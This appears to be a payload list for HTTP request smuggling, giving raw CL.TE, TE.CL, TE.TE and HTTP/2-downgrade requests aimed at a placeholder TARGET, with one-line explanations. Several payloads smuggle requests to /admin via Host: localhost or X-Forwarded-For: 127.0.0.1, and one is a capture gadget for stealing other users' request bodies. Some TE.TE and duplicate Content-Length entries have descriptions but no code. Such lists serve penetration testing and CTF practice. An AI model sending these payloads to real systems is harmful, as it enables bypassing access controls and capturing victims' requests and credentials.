meta.name: HTTP Request Smuggling
meta.description: HTTP request smuggling payloads for CL.TE, TE.CL, TE.TE, and HTTP/2 downgrade attacks. Exploits discrepancies between front-end proxy and back-end server in how they interpret request boundaries.

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
payloads.description: CL.TE detection probe — front-end uses Content-Length, back-end uses chunked TE; SMUGGLED poisons next request

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
payloads.description: CL.TE attack — smuggles a GET /404 request to confirm via 404 response on clean follow-up

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

username=a
payloads.description: CL.TE admin access — smuggles internal request to /admin with Host: localhost

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
payloads.description: TE.CL detection probe — front-end uses Transfer-Encoding, back-end uses Content-Length

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

1
a
0
payloads.description: TE.CL minimal probe — bare minimum chunked body to detect TE/CL discrepancy
TE.TE obfuscation header — dual TE headers where one is invalid; each server may pick different one
TE with tab obfuscation — some parsers reject tab before 'chunked', others accept
TE value prefix obfuscation — front-end may ignore; back-end may partially parse
TE header line-fold obfuscation — HTTP/1.1 obsolete line folding creates parser discrepancy

payloads.code:
POST / HTTP/2
Host: TARGET
Content-Length: 0

GET /smuggled HTTP/1.1
Host: TARGET
payloads.description: H2.CL smuggling — HTTP/2 request with Content-Length 0 hides HTTP/1.1 request when downgraded

payloads.code:
POST / HTTP/2
Host: TARGET
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
payloads.description: H2.TE smuggling — HTTP/2 with TE header (normally invalid in H2) triggers smuggling on downgrade

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Length: 68
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
X-Forwarded-For: 127.0.0.1
payloads.description: Smuggle with X-Forwarded-For: 127.0.0.1 — access admin panel by appearing to come from localhost

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

username=
payloads.description: Request capture gadget — smuggles partial POST to capture victim's request body on the back-end
Duplicate Content-Length header — some servers use first, others last, enabling CL desync

payloads.code:
GET / HTTP/1.1
Host: TARGET
Connection: keep-alive, X-Ignore-CL
X-Ignore-CL: 
Content-Length: 5

SMUGG
payloads.description: CL smuggling via Connection header abuse — some proxies strip headers listed in Connection

payloads.code:
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /flag HTTP/1.1
Host: TARGET
Content-Length: 150

x=
0
payloads.description: CTF-style flag access smuggling — TE.CL to access /flag endpoint through proxy
